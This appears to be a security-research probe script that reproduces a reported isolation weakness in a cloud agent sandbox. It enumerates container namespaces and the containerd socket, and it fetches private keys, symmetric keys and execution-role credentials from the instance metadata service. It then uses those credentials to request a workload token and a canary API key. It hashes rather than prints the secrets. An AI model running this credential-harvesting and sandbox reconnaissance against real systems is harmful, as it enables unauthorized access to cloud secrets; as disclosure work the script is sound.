"""
probe_h1_repro.py — self-contained reproduction probe for the 11-3 H1.

Runs the disclosure-bearing observations in one shell-tool invocation:

  A. Substrate identification
     /proc/1/{cgroup,status,mountinfo,ns/{net,user}} — confirm containerd
     substrate, host-namespaced net+user, uid 0, no seccomp filter.
  B. Default-position primitives
     ls -la /run/containerd/containerd.sock + /usr/local/bin/ctr version
     + ctr {namespaces,containers,tasks,images} list.
  C. Kepler MMDS key set
     IMDSv2 fetch of all eight aws_* tags; safe characterization (LEN +
     SHA only for the private key + symkey raw bytes; full PEM cert chain
     is OK to print, public material).
  D. TLS handshake to platform-proxy :8443
     curl -v https://[::1]:8443/ — confirm TLSv1.3 with same-trust-circle cert.
  E. Vault chain re-confirmation (only if Identity DP perms present)
     boto3 dp.get_workload_access_token + dp.get_resource_api_key.
     Skipped if exec role lacks perms (returns AccessDenied bound).

Authorized research; account owner is the test target. Output structured
markers; the notebook parser decodes.
"""

import os
import sys
import json
import base64
import hashlib
import subprocess


CANARY_PROVIDER_NAME = os.environ.get('REPRO_PROVIDER_NAME',
                                       'acab088-vault-probe-apikey')
CANARY_WORKLOAD_NAME = os.environ.get('REPRO_WORKLOAD_NAME',
                                       'acab088-vault-probe-wi')
EXPECTED_CANARY = 'IDENT-APIKEY-CANARY-9F3E2B1A-DO-NOT-USE'


def _b64(d):
    if isinstance(d, str):
        d = d.encode()
    return base64.b64encode(d).decode()


def _run(cmd, timeout=15, input_bytes=None):
    try:
        r = subprocess.run(
            cmd, capture_output=True, timeout=timeout, input=input_bytes)
        return r.returncode, r.stdout, r.stderr
    except Exception as e:
        return -1, b'', f'<{type(e).__name__}:{e}>'.encode()


def _safe_read(p, max_b=64 * 1024):
    try:
        with open(p, 'rb') as f:
            return f.read(max_b)
    except Exception as e:
        return f'<read-error:{type(e).__name__}:{e}>'.encode()


def section_a_substrate():
    print('=== A: SUBSTRATE ===')
    print(f'A_CGROUP={_b64(_safe_read("/proc/1/cgroup"))}')
    status = _safe_read('/proc/1/status', 16 * 1024)
    print(f'A_STATUS={_b64(status)}')
    # parse uid + nspid + caps + seccomp
    s = status.decode('utf-8', errors='replace')
    parsed = {}
    for line in s.splitlines():
        for k in ('Uid:', 'Gid:', 'NSpid:', 'CapEff:', 'NoNewPrivs:',
                  'Seccomp:', 'Seccomp_filters:'):
            if line.startswith(k):
                parsed[k.rstrip(':')] = line.split(None, 1)[1]
    print(f'A_PARSED={_b64(json.dumps(parsed).encode())}')
    rc, ns_net, _ = _run(['readlink', '/proc/1/ns/net'])
    rc, ns_user, _ = _run(['readlink', '/proc/1/ns/user'])
    rc, ns_pid, _ = _run(['readlink', '/proc/1/ns/pid'])
    rc, ns_self_net, _ = _run(['readlink', '/proc/self/ns/net'])
    rc, ns_self_user, _ = _run(['readlink', '/proc/self/ns/user'])
    print(f'A_NS_NET_PID1={_b64(ns_net)}')
    print(f'A_NS_NET_SELF={_b64(ns_self_net)}')
    print(f'A_NS_USER_PID1={_b64(ns_user)}')
    print(f'A_NS_USER_SELF={_b64(ns_self_user)}')
    # mountinfo head
    mi = _safe_read('/proc/1/mountinfo', 8 * 1024)
    print(f'A_MOUNTINFO_HEAD={_b64(mi)}')


def section_b_default_position():
    print('=== B: DEFAULT POSITION ===')
    rc, out, _ = _run(['ls', '-la', '/run/containerd/containerd.sock'])
    print(f'B_LS_SOCK={_b64(out)}')
    rc, out, _ = _run(['ls', '-la', '/usr/local/bin/ctr'])
    print(f'B_LS_CTR={_b64(out)}')
    rc, out, _ = _run(['/usr/local/bin/ctr', '--version'])
    print(f'B_CTR_VERSION={_b64(out)}')
    for sub in ('namespaces', 'containers', 'tasks', 'images'):
        rc, out, _ = _run(['/usr/local/bin/ctr', sub, 'list'])
        print(f'B_CTR_{sub.upper()}_RC={rc}')
        print(f'B_CTR_{sub.upper()}_OUT={_b64(out[:4000])}')


def imds_token():
    rc, tok, _ = _run([
        'curl', '-s', '-m', '5', '-X', 'PUT',
        'http://169.254.169.254/latest/api/token',
        '-H', 'X-aws-ec2-metadata-token-ttl-seconds: 120'])
    if rc != 0:
        return None
    return tok.strip().decode()


def imds_get(token, path):
    rc, body, _ = _run([
        'curl', '-s', '-m', '5',
        f'http://169.254.169.254{path}',
        '-H', f'X-aws-ec2-metadata-token: {token}'])
    return rc, body


def section_c_mmds():
    print('=== C: KEPLER MMDS KEY SET ===')
    token = imds_token()
    if not token:
        print('C_TOKEN_FAILED=1')
        return
    # Safe-to-print ID tags
    for tag in ('aws_microvm-id',
                'aws_application-instance-id',
                'aws_application-instance-group-key'):
        rc, body = imds_get(token, f'/latest/meta-data/tags/instance/{tag}')
        if rc == 0:
            print(f'C_TAG[{tag}]={_b64(body.strip())}')
    # Cert chain — public material, full echo OK
    rc, cert = imds_get(token,
        '/latest/meta-data/tags/instance/aws_instance-group-cert-chain-pem')
    if rc == 0:
        print(f'C_CERT_LEN={len(cert)}')
        print(f'C_CERT_PEM={_b64(cert)}')
    # Private key — LEN + SHA only, never raw
    rc, pk = imds_get(token,
        '/latest/meta-data/tags/instance/aws_instance-group-private-key-pem')
    if rc == 0:
        print(f'C_PRIVKEY_LEN={len(pk)}')
        print(f'C_PRIVKEY_SHA256={hashlib.sha256(pk).hexdigest()}')
        head = pk[:200].decode('utf-8', errors='replace')
        for marker in ('RSA PRIVATE KEY', 'EC PRIVATE KEY',
                       'PRIVATE KEY', 'OPENSSH PRIVATE KEY'):
            if marker in head:
                print(f'C_PRIVKEY_TYPE={marker}')
                break
    # Symmetric HMAC key — LEN + entropy + SHA, no raw
    rc, sym = imds_get(token,
        '/latest/meta-data/tags/instance/aws_instance-group-symmetric-key')
    if rc == 0:
        text = sym.decode('utf-8', errors='replace').strip()
        print(f'C_SYMKEY_TEXT_LEN={len(text)}')
        try:
            decoded = base64.b64decode(text, validate=True)
            print(f'C_SYMKEY_RAW_LEN={len(decoded)}')
            # entropy
            import math
            counts = {}
            for b in decoded:
                counts[b] = counts.get(b, 0) + 1
            n = len(decoded)
            ent = -sum((c/n) * math.log2(c/n) for c in counts.values())
            print(f'C_SYMKEY_ENTROPY={ent:.3f}')
            print(f'C_SYMKEY_SHA256={hashlib.sha256(decoded).hexdigest()}')
        except Exception as e:
            print(f'C_SYMKEY_DECODE_ERR={type(e).__name__}')
    # Pre-signed log URL — parse, don't PUT
    rc, url = imds_get(token,
        '/latest/meta-data/tags/instance/aws_presigned-log-url')
    if rc == 0:
        url_str = url.decode('utf-8', errors='replace').strip()
        print(f'C_LOG_URL_LEN={len(url_str)}')
        # extract host + first 60 chars of path + key qs params
        try:
            from urllib.parse import urlparse, parse_qs
            p = urlparse(url_str)
            qs = parse_qs(p.query)
            summary = {
                'host': p.netloc,
                'path_head': p.path[:120],
                'X-Amz-Credential': qs.get('X-Amz-Credential', [''])[0],
                'X-Amz-Expires': qs.get('X-Amz-Expires', [''])[0],
                'X-Amz-SignedHeaders': qs.get('X-Amz-SignedHeaders', [''])[0],
            }
            print(f'C_LOG_URL_PARSED={_b64(json.dumps(summary).encode())}')
        except Exception as e:
            print(f'C_LOG_URL_PARSE_ERR={type(e).__name__}:{e}')
    # KMS key
    rc, kid = imds_get(token,
        '/latest/meta-data/tags/instance/aws_presigned-log-kms-key')
    if rc == 0:
        print(f'C_LOG_KMS_ID={_b64(kid.strip())}')


def section_d_tls_handshake():
    print('=== D: TLS HANDSHAKE TO platform-proxy ===')
    # Plain TCP reachability
    import socket
    for addr in ('::1', '127.0.0.1'):
        family = socket.AF_INET6 if ':' in addr else socket.AF_INET
        s = socket.socket(family, socket.SOCK_STREAM)
        s.settimeout(3)
        try:
            s.connect((addr, 8443))
            print(f'D_PLAIN[{addr}:8443]=OPEN')
            s.close()
        except Exception as e:
            print(f'D_PLAIN[{addr}:8443]={type(e).__name__}:{e}')
    # curl -v with --insecure to capture handshake details
    for addr in ('::1', '127.0.0.1'):
        host = f'[{addr}]' if ':' in addr else addr
        rc, out, err = _run([
            'curl', '-v', '-k', '-m', '8',
            f'https://{host}:8443/'])
        # The handshake details are in stderr (verbose output)
        print(f'D_CURL[{addr}]_RC={rc}')
        print(f'D_CURL[{addr}]_VERBOSE={_b64(err[:6000])}')


def section_e_vault_chain():
    print('=== E: #3747844 VAULT CHAIN RE-CONFIRMATION ===')
    # Need IMDS exec-role creds for boto3
    token = imds_token()
    if not token:
        print('E_TOKEN_FAILED=1')
        return
    rc, creds_body = imds_get(token,
        '/latest/meta-data/iam/security-credentials/execution_role')
    if rc != 0:
        print('E_CREDS_FAILED=1')
        return
    try:
        creds = json.loads(creds_body.decode())
    except Exception as e:
        print(f'E_CREDS_PARSE_ERR={type(e).__name__}:{e}')
        return
    print(f'E_AKIA_PREFIX={creds["AccessKeyId"][:6]}')
    os.environ['AWS_ACCESS_KEY_ID'] = creds['AccessKeyId']
    os.environ['AWS_SECRET_ACCESS_KEY'] = creds['SecretAccessKey']
    os.environ['AWS_SESSION_TOKEN'] = creds['Token']
    try:
        import boto3
        from botocore.exceptions import ClientError
        dp = boto3.client('bedrock-agentcore', region_name='us-east-1')
        try:
            wat = dp.get_workload_access_token(workloadName=CANARY_WORKLOAD_NAME)
            tok = wat.get('workloadAccessToken')
            print(f'E_WAT_LEN={len(tok) if tok else 0}')
            if tok:
                api = dp.get_resource_api_key(
                    workloadIdentityToken=tok,
                    resourceCredentialProviderName=CANARY_PROVIDER_NAME)
                api.pop('ResponseMetadata', None)
                value = api.get('apiKey', '')
                print(f'E_APIKEY_LEN={len(value)}')
                print(f'E_APIKEY_SHA256={hashlib.sha256(value.encode()).hexdigest()}')
                print(f'E_APIKEY_MATCHES_EXPECTED={value == EXPECTED_CANARY}')
        except ClientError as e:
            code = e.response['Error']['Code']
            print(f'E_CLIENT_ERROR={code}')
            print(f'E_CLIENT_ERROR_MSG={_b64(e.response["Error"].get("Message","").encode())}')
    except Exception as e:
        print(f'E_BOTO_ERR={type(e).__name__}:{str(e)[:200]}')


def main():
    print('PROBE=h1-repro v1')
    for fn in (section_a_substrate,
               section_b_default_position,
               section_c_mmds,
               section_d_tls_handshake,
               section_e_vault_chain):
        try:
            fn()
        except Exception as e:
            print(f'SECTION_{fn.__name__.upper()}_ERR={type(e).__name__}:{e}')
    print('END')


if __name__ == '__main__':
    main()
